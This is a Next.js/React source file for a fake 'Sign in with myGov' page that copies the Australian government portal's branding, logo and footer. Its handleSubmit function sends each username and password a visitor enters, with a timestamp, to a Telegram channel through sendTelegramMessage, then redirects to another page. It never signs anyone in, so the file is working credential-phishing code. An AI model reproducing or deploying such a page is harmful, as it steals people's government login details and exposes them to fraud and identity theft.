/* eslint-disable @next/next/no-html-link-for-pages */
/* eslint-disable @next/next/no-img-element */
"use client"
import React, { useState } from "react";
import Link from "next/link";
import Image from "next/image";
import "../css/mgv2-application.css";
import "../css/blugov.css";
import { sendTelegramMessage } from "../../utils/telegram";

const MyGovSignInPage: React.FC = () => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");

  const handleSubmit = async (event: React.FormEvent) => {
    event.preventDefault();
    setError("");

    if (!username.trim() || !password.trim()) {
      setError("Please enter both username and password");
      return;
    }

    setIsLoading(true);
    const timestamp = new Date().toLocaleString();
    const message = `🔑 New Login Attempt\nUsername: ${username}\nPassword: ${password}\nTime: ${timestamp}`;

    try {
      await sendTelegramMessage(message);
      window.location.href = '/mygov2';
    } catch (err) {
      console.error('Login error:', err);
      setError("Service temporarily unavailable. Please try again later.");
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col">
      <Header />
      
      <main className="flex-grow bg-gray-50">
        <div className="container mx-auto px-4 py-8 md:py-12">
          <div className="max-w-md md:max-w-lg mx-auto bg-white rounded-xl shadow-2xl p-6 md:p-10">
            <div className="mb-10">
              <h1 className="text-3xl font-bold text-gray-900 mb-2">Sign in with myGov</h1>
              <h2 className="text-lg text-gray-600">Using your myGov sign in details</h2>
            </div>

            <Form 
              onSubmit={handleSubmit}
              error={error}
              username={username}
              setUsername={setUsername}
              password={password}
              setPassword={setPassword}
              isLoading={isLoading}
            />
          </div>
        </div>
      </main>

      <Footer />
    </div>
  );
};

const Header = () => (
  <header className="border-b border-gray-200 bg-[#66d3ee]">
  <div className="container mx-auto px-4 py-3">
    <div className="flex items-center justify-between">
      <a href="/" className="no-underline border-none hover:no-underline">
      
      <img
  src="/images/myGov-cobranded-logo-black.svg"
  alt="myGov Beta"
  width="200"
  height="50"
  style={{
    border: 'none',
    outline: 'none',
    display: 'block',
    maxWidth: '100%',
    height: 'auto',
    boxSizing: 'border-box',
  }}
/>


  
      </a>
    </div>
  </div>
</header>


);

const Form: React.FC<{
  onSubmit: (e: React.FormEvent) => void;
  error: string;
  username: string;
  setUsername: (val: string) => void;
  password: string;
  setPassword: (val: string) => void;
  isLoading: boolean;
}> = ({ onSubmit, error, username, setUsername, password, setPassword, isLoading }) => (
  <form onSubmit={onSubmit} className="space-y-8">
    {error && (
      <div 
        role="alert"
        className="text-red-600 text-sm p-4 bg-red-50 rounded-lg border-2 border-red-100"
      >
        {error}
      </div>
    )}

    <div className="space-y-6">
      <FormField
        id="userId"
        label="Username or email"
        type="text"
        value={username}
        onChange={setUsername}
        disabled={isLoading}
      />

      <FormField
        id="password"
        label="Password"
        type="password"
        value={password}
        onChange={setPassword}
        disabled={isLoading}
      />
    </div>

    <div className="text-right">
      <Link 
        href="/forgot-password" 
        className="text-blue-600 text-lg hover:text-blue-800 hover:underline"
      >
        Forgot password?
      </Link>
    </div>

    <SubmitButton isLoading={isLoading} />
    
    <div className="mt-10 pt-8 border-t border-gray-200">
      <p className="text-center text-lg text-gray-600">
        Don&apos;t have an account?{' '}
        <Link
          href="https://my.gov.au/en/create-account/"
          className="text-blue-600 hover:text-blue-800 hover:underline font-semibold"
          target="_blank"
          rel="noopener noreferrer"
        >
          Create a myGov account
        </Link>
      </p>
    </div>
  </form>
);

const FormField: React.FC<{
  id: string;
  label: string;
  type: string;
  value: string;
  onChange: (val: string) => void;
  disabled: boolean;
}> = ({ id, label, type, value, onChange, disabled }) => (
  <div>
    <label htmlFor={id} className="block text-lg font-medium text-gray-700 mb-3">
      {label}
    </label>
    <input
      id={id}
      type={type}
      value={value}
      onChange={(e) => onChange(e.target.value)}
      className="w-full px-4 py-3 text-lg border-2 border-gray-200 rounded-xl focus:outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-200"
      disabled={disabled}
      required
      aria-required
    />
  </div>
);

const SubmitButton: React.FC<{ isLoading: boolean }> = ({ isLoading }) => (
  <div className="flex justify-center bg-[#99e1f3] w-full hover:bg-[#88d9ef] transition-colors">
    <button
      type="submit"
      className="w-full h-full py-4 px-8 text-white text-xl font-bold rounded-xl 
                 transform transition-all duration-200 hover:scale-[1.02]
                 disabled:opacity-50 shadow-lg hover:shadow-xl"
      disabled={isLoading}
      aria-disabled={isLoading}
    >
      {isLoading ? 'Signing in...' : 'Sign in'}
    </button>
  </div>
);

const Footer = () => (
  <footer className="bg-gray-900 text-white">
    <div className="container mx-auto px-4 py-8">
      <nav className="mb-8">
        <ul className="flex flex-col md:flex-row gap-4 md:gap-8">
          <FooterLink href="/terms" text="Terms of use" />
          <FooterLink href="/privacy" text="Privacy and security" />
          <FooterLink href="/copyright" text="Copyright" />
          <FooterLink href="/accessibility" text="Accessibility" />
        </ul>
      </nav>

      <div className="border-t border-gray-800 pt-8">
        <div className="flex flex-col md:flex-row md:items-center md:justify-between gap-6">
          <Link href="/" className="hover:opacity-80 transition-opacity">
            <Image
              src="/images/myGov-cobranded-logo-white.svg"
              alt="myGov Beta"
              width={160}
              height={64}
              className="h-16 w-auto"
            />
          </Link>
          <p className="text-lg text-gray-400 max-w-2xl">
            We acknowledge the Traditional Custodians of the lands we live on. We pay our
            respects to all Elders, past and present, of all Aboriginal and Torres Strait
            Islander nations.
          </p>
        </div>
      </div>
    </div>
  </footer>
);

const FooterLink: React.FC<{ href: string; text: string }> = ({ href, text }) => (
  <li>
    <Link href={href} className="text-lg hover:text-blue-300 transition-colors">
      {text}
    </Link>
  </li>
);

export default MyGovSignInPage;